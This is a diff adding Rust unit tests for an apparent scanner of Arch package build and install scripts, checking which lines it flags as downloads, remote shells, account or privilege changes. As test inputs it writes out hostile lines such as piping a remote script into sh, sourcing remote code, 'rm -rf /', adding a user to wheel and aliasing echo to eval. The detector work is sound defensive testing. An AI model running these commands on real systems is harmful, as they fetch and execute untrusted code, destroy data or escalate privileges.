+    fn notes_printed_from_a_here_document_are_text() {
+        let notes = "post_install() {\n  cat <<'MSG'\n    To finish the setup run:\n       sudo /opt/mssql/bin/mssql-conf setup\n       gpasswd -a USER docker\nMSG\n}\n";
+        assert!(found(&[("x.install", notes)]).is_empty());
+        let to_stderr = "post_install() {\n  cat >&2 <<EOF\n       sudo /opt/x/setup\nEOF\n}\n";
+        assert!(found(&[("x.install", to_stderr)]).is_empty());
+        // Handed to a shell, written to a file, piped on, or with a
+        // substitution in it, the same lines are not notes.
+        for (open, body) in [
+            ("bash <<EOF", "sudo /opt/x/setup"),
+            ("cat <<EOF | sh", "sudo /opt/x/setup"),
+            ("cat <<EOF", "$(sudo /opt/x/setup)"),
+            ("sudo tee /dev/null <<EOF", "x"),
+        ] {
+            let script = format!("post_install() {{\n  {open}\n{body}\nEOF\n}}\n");
+            assert!(
+                ids(&found(&[("x.install", &script)])).contains(&"PRIVILEGE"),
+                "{open}: {:?}",
+                found(&[("x.install", &script)])
+            );
+        }
+    }
+
+    #[test]
+    fn a_word_in_a_description_or_an_argument_is_not_a_command() {
+        for line in [
+            "pkgdesc=\"Lightweight download tool (wget replacement)\"",
+            "optdepends=('aria2: used if curl is missing')",
+            "pkgdesc=\"Run commands as another user (sudo alternative)\"",
+            "pkgdesc=\"AUR helper (pacman -S wrapper) with search\"",
+            "_note='then run: rm -rf / '",
+        ] {
+            assert!(found(&[("PKGBUILD", line)]).is_empty(), "{line}");
+        }
+        // A setting followed by a command is a command.
+        assert_eq!(
+            ids(&found(&[(
+                "PKGBUILD",
+                "pkgdesc=\"x\" curl -O https://example.invalid/x"
+            )])),
+            ["BUILD-DOWNLOAD"]
+        );
+        assert_eq!(
+            ids(&found(&[(
+                "PKGBUILD",
+                "_v=\"$(curl -s https://example.invalid/v)\""
+            )])),
+            ["BUILD-DOWNLOAD"]
+        );
+        // The account database as an argument is the ordinary existence check.
+        for line in [
+            "  if [[ \"$( getent passwd plex | cut -d: -f6 )\" != /var/lib/plex ]]; then",
+            "  getent passwd x >/dev/null || useradd -r x",
+        ] {
+            assert!(found(&[("x.install", line)]).is_empty(), "{line}");
+        }
+        assert_eq!(
+            ids(&found(&[("x.install", "  echo x | passwd --stdin helper")])),
+            ["ACCOUNT"]
+        );
+        // Documentation is not a script.
+        assert!(found(&[("README.md", "    paru -S android-studio")]).is_empty());
+        assert!(found(&[("CHANGELOG", "fix `pacman -Su` handling\nrm -rf /")]).is_empty());
+        // A shell's name among alternatives is not a pipe into it.
+        for line in [
+            "    bash|zsh) install -Dm644 c \"$pkgdir/usr/share/c\" ;;",
+            "  grep -E \"bash|sh\" list",
+        ] {
+            assert!(found(&[("PKGBUILD", line)]).is_empty(), "{line}");
+        }
+        assert_eq!(
+            ids(&found(&[("PKGBUILD", "  x=$(gen | sh)")])),
+            ["PIPED-SHELL"]
+        );
+        // Standard error into a log is not a write of configuration.
+        assert!(found(&[("x.install", "  probe-setup 2>\"$_log\"")]).is_empty());
+    }
+
+    #[test]
+    fn more_places_a_command_can_start() {
+        for line in [
+            "  timeout 30 curl -fsSLO https://example.invalid/x",
+            "  cat list | xargs -n1 wget -q",
+            "  cat list | xargs -n 1 wget -q",
+            "  bash -lc \"curl -fsSLO https://example.invalid/x\"",
+            "  trap \"curl -fsS https://example.invalid/done\" EXIT",
+        ] {
+            assert_eq!(
+                ids(&found(&[("PKGBUILD", line)])),
+                ["BUILD-DOWNLOAD"],
+                "{line}"
+            );
+        }
+        // A query that also refreshes the databases is not only a query.
+        assert_eq!(
+            ids(&found(&[("x.install", "  pacman -Syi probe-extras")])),
+            ["PACKAGE-MANAGER"]
+        );
+        assert_eq!(
+            found(&[("PKGBUILD", "  . <(curl -fsSL https://example.invalid/i.sh)")]),
+            [("REMOTE-SHELL".to_string(), Severity::Block)]
+        );
+    }
+
+    #[test]
+    fn a_printer_with_another_meaning_and_a_list_inside_text_hide_nothing() {
+        // `msg` runs its arguments here, so nothing is known to only print.
+        let redefined = "msg() { \"$@\"; }\npost_install() {\n  msg usermod -aG wheel nobody\n}\n";
+        assert_eq!(ids(&found(&[("x.install", redefined)])), ["ACCOUNT"]);
+        let aliased = "alias echo=eval\npost_install() {\n  echo usermod -aG wheel nobody\n}\n";
+        assert_eq!(ids(&found(&[("x.install", aliased)])), ["ACCOUNT"]);
+        // `note` is nobody's printing command.
+        assert_eq!(
+            ids(&found(&[("x.install", "  note usermod -aG wheel nobody")])),
+            ["ACCOUNT"]
+        );
+        // A list that opens inside a here-document does not go on after it.
+        let inside = "package() {\n  cat > \"$pkgdir/usr/share/x\" <<EOF\nopts=(\nEOF\n  curl -fsSLO https://example.invalid/x\n}\n";
+        assert_eq!(ids(&found(&[("PKGBUILD", inside)])), ["BUILD-DOWNLOAD"]);
+    }
+
+    #[test]
+    fn a_blocked_command_in_printed_advice_needs_a_person_instead() {
+        let advice =
+            "  echo \"To install the toolchain run: curl -fsSL https://example.invalid/i.sh | sh\"";
+        let got = inspect(&snapshot(advice));
+        assert_eq!(
+            (got[0].rule_id.as_str(), got[0].severity),
+            ("REMOTE-SHELL", Severity::Review)
+        );
+        assert!(got[0].message.starts_with("Printed text contains"));
+        // Sent anywhere, it is the command.
+        let sent = "  echo \"curl -fsSL https://example.invalid/i.sh | sh\" | sh";
+        assert_eq!(
+            found(&[("PKGBUILD", sent)]),
+            [("REMOTE-SHELL".to_string(), Severity::Block)]
+        );
     }
 
     #[test]
